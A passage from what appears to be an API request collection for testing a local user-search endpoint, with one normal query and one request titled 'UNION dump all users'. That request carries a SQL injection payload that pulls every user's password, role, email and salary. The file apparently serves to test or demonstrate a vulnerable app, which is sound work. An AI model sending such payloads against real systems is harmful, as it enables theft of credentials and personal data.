        {
          "name": "Search — normal (admin)",
          "request": {
            "method": "GET",
            "header": [],
            "url": {
              "raw": "http://localhost:3000/api/users/search?username=admin",
              "host": ["http://localhost:3000"],
              "path": ["api", "users", "search"],
              "query": [
                {
                  "key": "username",
                  "value": "admin"
                }
              ]
            }
          }
        },
        {
          "name": "Search — UNION dump all users",
          "request": {
            "method": "GET",
            "header": [],
            "url": {
              "raw": "http://localhost:3000/api/users/search?username=' UNION SELECT id, username, password, role, email, salary FROM users -- ",
              "host": ["http://localhost:3000"],
              "path": ["api", "users", "search"],
              "query": [
                {
                  "key": "username",
                  "value": "' UNION SELECT id, username, password, role, email, salary FROM users -- "
                }
              ]
            }
          }
        },
